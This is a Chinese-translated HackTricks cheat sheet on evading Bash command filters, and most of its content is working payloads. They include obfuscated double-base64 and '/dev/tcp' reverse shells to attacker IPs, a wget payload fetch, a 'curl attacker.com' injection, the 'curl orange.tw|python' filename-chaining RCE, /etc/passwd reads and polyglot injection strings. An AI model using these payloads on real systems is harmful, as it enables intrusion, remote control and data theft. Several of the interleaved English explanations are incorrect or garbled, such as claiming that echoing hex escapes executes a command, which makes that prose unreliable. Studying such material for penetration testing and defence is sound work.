# 绕过Linux限制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)可以轻松构建和**自动化工作流程**，使用世界上**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 常见限制绕过

### 反向Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 简短的反向Shell

A reverse shell is a technique used to establish a connection from a target machine to an attacker-controlled machine. It allows the attacker to execute commands on the target machine remotely. In this section, we will discuss a short reverse shell payload that can be used to bypass certain restrictions in the Bash shell.

一个反向Shell是一种技术，用于在目标机器和攻击者控制的机器之间建立连接。它允许攻击者远程在目标机器上执行命令。在本节中，我们将讨论一种简短的反向Shell有效载荷，可用于绕过Bash shell中的某些限制。

The following command can be used to create a short reverse shell payload:

以下命令可用于创建一个简短的反向Shell有效载荷：

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

Replace `ATTACKER_IP` with the IP address of the attacker-controlled machine and `ATTACKER_PORT` with the port number on which the attacker is listening for incoming connections.

将`ATTACKER_IP`替换为攻击者控制机器的IP地址，将`ATTACKER_PORT`替换为攻击者正在监听传入连接的端口号。

This command uses the `/dev/tcp` feature in Bash to redirect input and output to a network socket. It establishes a connection to the specified IP address and port number, allowing the attacker to interact with the target machine.

该命令使用Bash中的`/dev/tcp`功能将输入和输出重定向到网络套接字。它建立到指定IP地址和端口号的连接，允许攻击者与目标机器进行交互。

Note that this technique may not work on all systems, as it relies on the availability of the `/dev/tcp` feature in Bash. Additionally, firewalls and network restrictions may prevent the reverse shell from establishing a connection.

请注意，该技术可能无法在所有系统上正常工作，因为它依赖于Bash中`/dev/tcp`功能的可用性。此外，防火墙和网络限制可能会阻止反向Shell建立连接。

It is important to use this technique responsibly and only on systems that you have permission to access. Unauthorized use of reverse shells is illegal and unethical.

在使用此技术时，请负责任地仅在您有权限访问的系统上使用。未经授权使用反向Shell是非法和不道德的。
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 绕过路径和禁用词

When conducting a penetration test or trying to gain unauthorized access to a system, it is common to encounter restrictions on certain paths and forbidden words. These restrictions are put in place to prevent unauthorized access and protect the system from potential vulnerabilities.

However, as a hacker, it is important to know how to bypass these restrictions and find alternative paths to achieve your goals. Here are some useful Linux commands that can help you bypass paths and forbidden words:

1. **mv** command: The `mv` command can be used to rename files and directories. By renaming a restricted file or directory to a non-restricted name, you can bypass the restriction and gain access.

2. **ln** command: The `ln` command can be used to create symbolic links. By creating a symbolic link to a restricted file or directory with a non-restricted name, you can bypass the restriction and gain access.

3. **find** command: The `find` command can be used to search for files and directories. By using the `-iname` option, you can search for files and directories regardless of case sensitivity. This can help you bypass restrictions on forbidden words.

4. **grep** command: The `grep` command can be used to search for specific patterns in files. By using the `-i` option, you can perform a case-insensitive search. This can help you bypass restrictions on forbidden words.

5. **sed** command: The `sed` command can be used to perform text transformations. By using the `s/old/new/gi` syntax, you can replace occurrences of a forbidden word with a non-restricted word. This can help you bypass restrictions on forbidden words.

It is important to note that bypassing restrictions and gaining unauthorized access to a system is illegal and unethical. These commands should only be used for educational purposes or with proper authorization. Always ensure that you have the necessary permissions before attempting any actions on a system.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 绕过禁止空格

In some cases, when attempting to execute commands that contain spaces, you may encounter restrictions that prevent the execution. However, there are several techniques you can use to bypass these restrictions and successfully execute the desired commands.

#### Technique 1: Enclosing the command in quotes

One simple technique is to enclose the entire command, including the spaces, in quotes. This tells the shell to treat the entire command as a single argument, effectively bypassing any restrictions on spaces.

For example, instead of running the command `ls -l /etc/passwd`, which contains a space between `ls` and `-l`, you can run `"ls -l /etc/passwd"`.

#### Technique 2: Using escape characters

Another technique is to use escape characters to indicate that the space should be treated as part of the command, rather than a delimiter. The most commonly used escape character is the backslash `\`.

For example, instead of running the command `ls -l /etc/passwd`, you can run `ls\ -l\ /etc/passwd`.

#### Technique 3: Using alternative shells

If the restrictions on spaces are specific to the default shell, you can try using an alternative shell that does not have these restrictions. For example, you can use the `bash` shell instead of the default `sh` shell.

To do this, you can run the command `/bin/bash -c "ls -l /etc/passwd"`. This tells the system to execute the command using the `bash` shell, which does not have the same restrictions on spaces.

By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces. However, it is important to note that bypassing restrictions may be considered unauthorized access and may be illegal. Always ensure that you have proper authorization before attempting to bypass any restrictions.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 绕过反斜杠和斜杠限制

在某些情况下，系统管理员可能会限制用户在命令行中使用反斜杠（\）和斜杠（/）字符。这些限制可能会妨碍我们执行某些操作，但我们可以使用一些技巧来绕过这些限制。

#### 使用ASCII码

我们可以使用ASCII码来绕过反斜杠和斜杠的限制。每个字符都有一个对应的ASCII码值，我们可以使用这些值来代替字符。

例如，要输入反斜杠字符（\），我们可以使用ASCII码值`\`（92）来代替。同样地，要输入斜杠字符（/），我们可以使用ASCII码值`/`（47）来代替。

以下是使用ASCII码绕过反斜杠和斜杠限制的示例：

```bash
$ echo -e "\x5c"  # 使用ASCII码值92代替反斜杠
\

$ echo -e "\x2f"  # 使用ASCII码值47代替斜杠
/
```

#### 使用Unicode编码

除了ASCII码，我们还可以使用Unicode编码来绕过反斜杠和斜杠的限制。Unicode编码是一种用于表示字符的标准，它为每个字符分配了一个唯一的数字值。

要输入反斜杠字符（\），我们可以使用Unicode编码`\u005c`来代替。同样地，要输入斜杠字符（/），我们可以使用Unicode编码`\u002f`来代替。

以下是使用Unicode编码绕过反斜杠和斜杠限制的示例：

```bash
$ echo -e "\u005c"  # 使用Unicode编码\u005c代替反斜杠
\

$ echo -e "\u002f"  # 使用Unicode编码\u002f代替斜杠
/
```

通过使用ASCII码或Unicode编码，我们可以绕过反斜杠和斜杠的限制，从而执行我们需要的操作。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 绕过管道限制

In some cases, you may encounter restrictions that prevent you from using certain characters or commands in a bash pipeline. However, there are ways to bypass these restrictions and still achieve the desired result.

在某些情况下，您可能会遇到限制，阻止您在bash管道中使用某些字符或命令。然而，有一些方法可以绕过这些限制，仍然实现所需的结果。

One method is to use alternative characters or commands that have similar functionality. For example, if the "|" character is restricted, you can try using the "tee" command instead. The "tee" command reads from standard input and writes to both standard output and files, effectively simulating the behavior of the "|" character.

一种方法是使用具有类似功能的替代字符或命令。例如，如果限制了"|"字符，您可以尝试使用"tee"命令代替。"tee"命令从标准输入读取，并同时将内容写入标准输出和文件，有效地模拟了"|"字符的行为。

Another method is to use command substitution. Command substitution allows you to execute a command and use its output as part of another command. This can be useful when certain characters are restricted. For example, instead of using the "|" character, you can use command substitution to achieve a similar result.

另一种方法是使用命令替换。命令替换允许您执行一个命令，并将其输出作为另一个命令的一部分使用。当某些字符受限时，这非常有用。例如，您可以使用命令替换来实现类似的结果，而不是使用"|"字符。

To use command substitution, enclose the command you want to execute within backticks (\`command\`) or use the dollar sign and parentheses (\$(command)). The output of the command will be substituted into the command line.

要使用命令替换，将要执行的命令用反引号(\`command\`)括起来，或者使用美元符号和括号(\$(command))。命令的输出将被替换到命令行中。

By using these techniques, you can bypass restrictions on certain characters or commands in a bash pipeline and continue with your desired operations.

通过使用这些技术，您可以绕过bash管道中对某些字符或命令的限制，并继续进行所需的操作。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 通过十六进制编码绕过限制

Sometimes, when trying to execute certain commands or access restricted files, you may encounter restrictions imposed by the system. One way to bypass these restrictions is by using hex encoding.

有时候，在尝试执行特定命令或访问受限文件时，你可能会遇到系统强加的限制。绕过这些限制的一种方法是使用十六进制编码。

Hex encoding involves converting the characters of a command or file path into their hexadecimal representation. This can be done using the `xxd` command in Linux.

十六进制编码涉及将命令或文件路径的字符转换为十六进制表示。在Linux中，可以使用`xxd`命令来完成这个过程。

To bypass restrictions using hex encoding, follow these steps:

要通过十六进制编码绕过限制，请按照以下步骤进行操作：

1. Identify the command or file path that is restricted.

   确定受限制的命令或文件路径。

2. Convert the characters of the command or file path into their hexadecimal representation using the `xxd` command. For example, to convert the command `ls` into hexadecimal, you would run:

   使用`xxd`命令将命令或文件路径的字符转换为十六进制表示。例如，要将命令`ls`转换为十六进制，可以运行以下命令：

   ```bash
   echo -n "ls" | xxd -p
   ```

   This will output the hexadecimal representation of the command, which in this case is `6c73`.

   这将输出命令的十六进制表示，本例中为`6c73`。

3. Use the hexadecimal representation of the command or file path to bypass the restrictions. For example, instead of running `ls`, you would run:

   使用命令或文件路径的十六进制表示来绕过限制。例如，不要运行`ls`，而是运行：

   ```bash
   echo -e "\x6c\x73"
   ```

   This will execute the command `ls` and bypass the restrictions.

   这将执行命令`ls`并绕过限制。

By using hex encoding, you can bypass certain restrictions imposed by the system and execute commands or access files that would otherwise be restricted.

通过使用十六进制编码，你可以绕过系统强加的某些限制，执行命令或访问本来受限的文件。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### 绕过IP限制

Sometimes during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can use various techniques to bypass these IP restrictions and gain access to the target system. Here are a few useful Linux commands that can help you achieve this:

#### 1. IP Spoofing

IP spoofing involves modifying the source IP address of network packets to make it appear as if they are coming from a different IP address. This can be done using the `hping3` command. Here's an example:

```bash
hping3 -a <spoofed_ip> -c 1 <target_ip>
```

Replace `<spoofed_ip>` with the IP address you want to spoof and `<target_ip>` with the IP address of the target system.

#### 2. Proxychains

Proxychains is a tool that allows you to run any program through a proxy server. This can help you bypass IP restrictions by routing your traffic through a different IP address. To use Proxychains, you need to configure the `proxychains.conf` file with the appropriate proxy server details. Once configured, you can run any command with Proxychains like this:

```bash
proxychains <command>
```

Replace `<command>` with the command you want to run.

#### 3. VPN

Using a Virtual Private Network (VPN) can also help you bypass IP restrictions. A VPN creates a secure and encrypted connection between your device and a remote server, effectively masking your IP address. There are various VPN providers available, and you can use their client software or configure VPN settings manually on your Linux system.

#### 4. Tor

Tor is a network of volunteer-operated servers that allows you to browse the internet anonymously. By routing your traffic through multiple Tor nodes, your IP address is hidden, making it difficult to trace your activities. To use Tor, you can install the Tor Browser or configure your system to use the Tor network directly.

These are just a few techniques you can use to bypass IP restrictions during a penetration test. It's important to note that unauthorized access to systems is illegal, and you should only perform these actions with proper authorization and for legitimate purposes.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 基于时间的数据泄露

Time based data exfiltration is a technique used by hackers to bypass restrictions and exfiltrate data from a compromised system. This technique involves using delays or timing mechanisms to transmit data in a covert manner, making it difficult to detect.

In a typical scenario, the hacker may use a command injection vulnerability to execute arbitrary commands on the compromised system. Instead of directly transmitting the exfiltrated data, the hacker can use time delays to encode the data and transmit it in a way that appears innocuous.

For example, the hacker may use the `ping` command to send ICMP echo requests to a remote server. By manipulating the payload of the ICMP packets, the hacker can encode the exfiltrated data. The delay between the ICMP requests can be used to transmit binary data, with a longer delay representing a binary 1 and a shorter delay representing a binary 0.

To detect and prevent time based data exfiltration, it is important to implement proper input validation and sanitization to prevent command injection vulnerabilities. Additionally, network monitoring and anomaly detection can help identify unusual patterns of ICMP traffic that may indicate data exfiltration.

By understanding and being aware of time based data exfiltration techniques, system administrators and security professionals can better protect their systems from such attacks.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 从环境变量中获取字符

In some cases, you may encounter restrictions that prevent you from executing certain commands or accessing certain files. However, you can still bypass these restrictions by utilizing the values stored in environment variables.

在某些情况下，您可能会遇到阻止您执行某些命令或访问某些文件的限制。然而，您仍然可以通过利用环境变量中存储的值来绕过这些限制。

To extract characters from environment variables, you can use the `echo` command along with the variable name enclosed in dollar signs (`$`). For example, if you have an environment variable named `SECRET` that contains the value `password123`, you can retrieve the characters by running the following command:

要从环境变量中提取字符，您可以使用`echo`命令以及用美元符号（`$`）括起来的变量名。例如，如果您有一个名为`SECRET`的环境变量，其中包含值`password123`，您可以通过运行以下命令来检索字符：

```bash
echo $SECRET
```

This command will output `password123`, allowing you to access the characters stored in the `SECRET` environment variable.

该命令将输出`password123`，使您能够访问存储在`SECRET`环境变量中的字符。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS数据泄露

你可以使用**burpcollab**或[**pingb**](http://pingb.in)等工具。

### 内置命令

如果你无法执行外部函数，只能访问**有限的内置命令来获取RCE**，那么有一些巧妙的技巧可以帮助你。通常你**无法使用所有的**内置命令，所以你应该**了解所有的选项**来尝试绕过限制。这个想法来自[**devploit**](https://twitter.com/devploit)。\
首先，检查所有的[**shell内置命令**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**。**然后，这里有一些建议：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### 多语言命令注入

Polyglot command injection (多语言命令注入) 是一种利用不同语言解释器的漏洞来执行恶意命令的技术。这种攻击方法可以绕过基于 Bash 的限制，因为它利用了其他语言解释器的弱点。

在进行多语言命令注入时，攻击者会构造一个恶意输入，该输入既可以被 Bash 解释为有效的命令，又可以被其他语言解释器解释为有效的代码。这样，攻击者就可以在目标系统上执行任意命令，而不受 Bash 限制的影响。

为了成功执行多语言命令注入攻击，攻击者需要了解目标系统上可用的语言解释器，并构造一个能够被多个解释器解释的有效命令。这通常需要对目标系统进行详细的信息收集和分析。

为了防止多语言命令注入攻击，建议采取以下措施：

- 及时更新和修补系统，以防止已知的语言解释器漏洞被利用。
- 限制用户对系统的访问权限，特别是对敏感命令和文件的访问权限。
- 对用户输入进行严格的验证和过滤，以防止恶意输入被解释为有效的命令。
- 使用安全的编程实践，如避免使用用户输入直接拼接命令字符串。

通过采取这些措施，可以有效减少多语言命令注入攻击的风险，并提高系统的安全性。
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 绕过潜在的正则表达式限制

在进行渗透测试时，有时会遇到正则表达式的限制，这可能会阻碍我们的进一步操作。然而，我们可以使用一些技巧来绕过这些限制。

#### 1. 使用字符类

正则表达式中的字符类可以帮助我们绕过某些限制。例如，如果我们想匹配一个数字，但是正则表达式限制了我们只能使用字母，我们可以使用字符类来绕过这个限制。例如，`[0-9]`可以匹配任何数字。

#### 2. 使用转义字符

转义字符可以帮助我们绕过正则表达式的限制。例如，如果正则表达式限制了我们不能使用特殊字符，我们可以使用转义字符`\`来转义这些字符。例如，`\.`可以匹配一个点。

#### 3. 使用反向引用

反向引用可以帮助我们绕过正则表达式的限制。如果正则表达式限制了我们不能使用某些特定的字符串，但是我们可以使用其他字符串，我们可以使用反向引用来引用这些字符串。例如，如果正则表达式限制了我们不能使用`abc`，但是我们可以使用`def`，我们可以使用反向引用`\1`来引用`def`。

#### 4. 使用非贪婪匹配

非贪婪匹配可以帮助我们绕过正则表达式的限制。正则表达式通常是贪婪匹配，即尽可能多地匹配字符。但是，如果我们想要匹配尽可能少的字符，我们可以使用非贪婪匹配。例如，`.*?`可以匹配尽可能少的任意字符。

#### 5. 使用零宽断言

零宽断言可以帮助我们绕过正则表达式的限制。零宽断言是一种特殊的正则表达式语法，用于在匹配字符串时指定一些条件。例如，如果正则表达式限制了我们只能匹配一个特定的字符串，我们可以使用零宽断言来指定其他条件。例如，`(?=.*[A-Z])`可以匹配包含至少一个大写字母的字符串。

通过使用这些技巧，我们可以绕过正则表达式的限制，从而更好地进行渗透测试。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bash混淆器

Bashfuscator是一个用于混淆Bash脚本的工具。它可以修改脚本的结构和语法，使其难以理解和分析。通过使用Bashfuscator，攻击者可以绕过Bash脚本的限制，隐藏恶意代码的真实意图。

#### 使用Bashfuscator的步骤

1. **安装Bashfuscator**：首先，需要从Bashfuscator的官方网站下载并安装该工具。

2. **选择要混淆的脚本**：选择要混淆的Bash脚本文件。

3. **运行Bashfuscator**：使用以下命令运行Bashfuscator，并指定要混淆的脚本文件：

   ```
   bashfuscator -i <input_script> -o <output_script>
   ```

   其中，`<input_script>`是要混淆的脚本文件的路径，`<output_script>`是混淆后的脚本文件的路径。

4. **查看混淆结果**：Bashfuscator将生成一个混淆后的脚本文件。您可以查看该文件，以确保混淆成功。

5. **测试混淆后的脚本**：在安全环境中运行混淆后的脚本，以确保其功能正常。

#### 注意事项

- 在使用Bashfuscator混淆脚本之前，请确保您已经获得了合法的授权，并且仅在合法的渗透测试活动中使用该工具。

- 混淆脚本可能会导致代码的可读性降低，因此在使用Bashfuscator之前，请确保您已经备份了原始脚本文件。

- Bashfuscator只能提供一定程度的混淆，不能完全防止脚本被分析和理解。因此，在编写安全脚本时，请考虑其他安全措施和最佳实践。

#### 结论

Bashfuscator是一个强大的工具，可以帮助攻击者绕过Bash脚本的限制，并隐藏恶意代码的真实意图。然而，使用该工具需要谨慎，并且仅限于合法的渗透测试活动中。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 五个字符实现远程命令执行（RCE）

在某些情况下，我们可能会遇到受限制的环境，其中我们无法使用常规的命令执行技术。然而，我们仍然可以利用一些特殊的字符来绕过这些限制，并实现远程命令执行（RCE）。

以下是一个使用仅五个字符的方法来实现RCE的示例：

```bash
${IFS%?}bash
```

这个方法的原理是利用了`${IFS}`变量，它代表了Shell中的字段分隔符。我们使用`${IFS%?}`来删除`${IFS}`变量的最后一个字符，然后将其与`bash`命令组合在一起。这样，我们就可以在受限制的环境中执行`bash`命令，从而实现远程命令执行。

请注意，这种技术可能不适用于所有环境，因为某些环境可能会对`${IFS}`变量进行限制或过滤。在实际应用中，我们应该根据具体情况进行调整和测试。

这是一个简单而有效的方法，可以帮助我们在受限制的环境中实现远程命令执行。但是，我们应该始终遵循道德准则，并仅在合法授权的情况下使用这些技术。
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4个字符的RCE

在某些情况下，我们可能会遇到只允许使用非交互式shell的限制。这种情况下，我们需要找到一种方法来绕过这个限制并执行我们的命令。下面是一种使用只有4个字符的远程代码执行（RCE）技巧。

#### 使用反引号

在Bash中，我们可以使用反引号（`）来执行命令并将其结果返回给我们。这个特性可以帮助我们绕过限制并执行我们的命令。

```bash
`<command>`
```

例如，如果我们想执行`ls`命令，我们可以使用以下方式：

```bash
`ls`
```

这将执行`ls`命令并返回结果。

#### 示例

假设我们只能使用非交互式shell，并且我们想执行`id`命令来获取当前用户的身份信息。我们可以使用以下命令：

```bash
`id`
```

这将执行`id`命令并返回当前用户的身份信息。

请注意，这种技巧只适用于允许使用反引号的情况。在某些情况下，这种技巧可能无法使用。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 只读/Noexec/Distroless绕过

如果你在一个具有**只读和noexec保护**甚至是在一个distroless容器中，仍然有办法**执行任意二进制文件，甚至是一个shell！:**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot和其他监狱绕过

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考资料和更多

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
